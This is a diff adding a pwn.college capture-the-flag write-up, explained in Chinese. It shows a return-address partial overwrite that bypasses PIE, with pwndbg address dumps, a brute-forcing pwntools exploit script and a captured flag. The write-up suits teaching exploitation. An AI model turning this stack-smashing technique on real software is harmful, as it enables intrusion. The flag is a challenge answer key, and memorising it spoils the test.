@@ -2281,3 +2281,169 @@ target.recvall()
 #### Flag
 
 Flag: `pwn.college{Mlgp6gl7Ogp1vkjstLEXXOSldEM.0FMwMDL5cTNxgzW}`
+
+### Level 7.0
+
+#### Information
+
+- Category: Pwn
+
+#### Description
+
+> Overflow a buffer and smash the stack to obtain the flag, but this time in a position independent (PIE) binary!
+
+#### Write-up
+
+这题和前两题差不多，都是计算 padding 和覆盖返回地址，唯一的区别在于它启用了 PIE 保护，导致我们无法知道确切的返回地址。这里我们通过 `Partial Write` 的方式绕过 PIE。
+
+`Partial Write` 利用了操作系统加载程序时总是将程序加载到随机的内存页，通常内存页是 `0x1000` 字节，4 KB 对齐的，也就是说程序内部指令的偏移量都不可能超出这个范围，不够就分配到下一个内存页，比如 `0x2000`。所以开启了 PIE 的程序，尽管每次运行都被分配到不同的内存页，但它们在内存页中的偏移地址，也就是最后 3 nibbles 始终是相同的。利用这一点，我们只需要覆盖这最后 3 nibbles 即可达到控制返回地址的效果。
+
+但由于我们没办法写入半个字节，所以我们需要猜一个 nibble，范围是 `[0x0, 0xf]`。将它和固定的 3 nibbles 组合输入到程序，如果地址匹配就成功跳转了。
+
+下面看看开启 PIE 后的效果（每次运行都会随机分配基地址，但最后 3 nibbles 偏移地址始终是固定的）。
+
+**Run 1:**
+
+```asm wrap=false showLineNumbers=false "0x6123056c8000"
+pwndbg> piebase
+Calculated VA from /home/cub3y0nd/Projects/pwn.college/babymem-level-7-0 = 0x6123056c8000
+pwndbg> i fun main
+All functions matching regular expression "main":
+
+Non-debugging symbols:
+0x00006123056ca3c3  main
+0x00007149f9ca4e40  __libc_start_main
+0x00007149f9cb4b70  bindtextdomain
+0x00007149f9cb4bb0  bind_textdomain_codeset
+0x00007149f9cb86b0  textdomain
+0x00007149f9d026c0  _IO_switch_to_main_wget_area
+0x00007149f9d8e0b0  getdomainname
+0x00007149f9d95d00  setdomainname
+0x00007149f9da4b90  __getdomainname_chk
+0x00007149f9db6940  __res_nquerydomain
+0x00007149f9db6940  res_nquerydomain
+0x00007149f9db69f0  __res_querydomain
+0x00007149f9db69f0  res_querydomain
+pwndbg> i fun challenge
+All functions matching regular expression "challenge":
+
+Non-debugging symbols:
+0x00006123056c9d0b  challenge
+pwndbg> i fun win_authed
+All functions matching regular expression "win_authed":
+
+Non-debugging symbols:
+0x00006123056c9bee  win_authed
+pwndbg>
+```
+
+**Run 2:**
+
+```asm wrap=false showLineNumbers=false "0x622fffad3000"
+pwndbg> piebase
+Calculated VA from /home/cub3y0nd/Projects/pwn.college/babymem-level-7-0 = 0x622fffad3000
+pwndbg> i fun main
+All functions matching regular expression "main":
+
+Non-debugging symbols:
+0x0000622fffad53c3  main
+0x0000781a2c3f4e40  __libc_start_main
+0x0000781a2c404b70  bindtextdomain
+0x0000781a2c404bb0  bind_textdomain_codeset
+0x0000781a2c4086b0  textdomain
+0x0000781a2c4526c0  _IO_switch_to_main_wget_area
+0x0000781a2c4de0b0  getdomainname
+0x0000781a2c4e5d00  setdomainname
+0x0000781a2c4f4b90  __getdomainname_chk
+0x0000781a2c506940  __res_nquerydomain
+0x0000781a2c506940  res_nquerydomain
+0x0000781a2c5069f0  __res_querydomain
+0x0000781a2c5069f0  res_querydomain
+pwndbg> i fun challenge
+All functions matching regular expression "challenge":
+
+Non-debugging symbols:
+0x0000622fffad4d0b  challenge
+pwndbg> i fun win_authed
+All functions matching regular expression "win_authed":
+
+Non-debugging symbols:
+0x0000622fffad4bee  win_authed
+pwndbg>
+```
+
+#### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import context, ELF, log, pause, process, random, remote, gdb
+
+context(os="linux", arch="amd64", log_level="debug", terminal="kitty")
+
+FILE = "./babymem-level-7-0"
+HOST = "pwn.college"
+PORT = 1337
+
+gdbscript = """
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+padding_size = 0x38
+fixed_offset = b"\x0a"
+unknown_bytes = [bytes([i]) for i in range(0x0C, 0x10C, 0x10)]
+
+
+def send_payload(target, payload):
+    try:
+        payload_size = f"{len(payload)}".encode()
+        target.recvuntil(b"Payload size: ")
+        target.sendline(payload_size)
+        target.recvuntil(b"Send your payload")
+        target.send(payload)
+
+        response = target.recvall()
+
+        return b"You win!" in response
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
+        return False
+
+
+while True:
+    try:
+        target = launch()
+
+        payload = b"A" * padding_size
+        payload += fixed_offset + random.choice(unknown_bytes)
+        log.info(f"Trying payload: {payload.hex()}")
+
+        if send_payload(target, payload):
+            log.success("Success! Exiting...")
+
+            pause()
+            exit()
+    except Exception as e:
+        print(f"An error occurred in main loop: {e}")
+```
+
+#### Flag
+
+Flag: `pwn.college{0svlAHsYG0L-ONps0VQ3ssICrbb.0VMwMDL5cTNxgzW}`
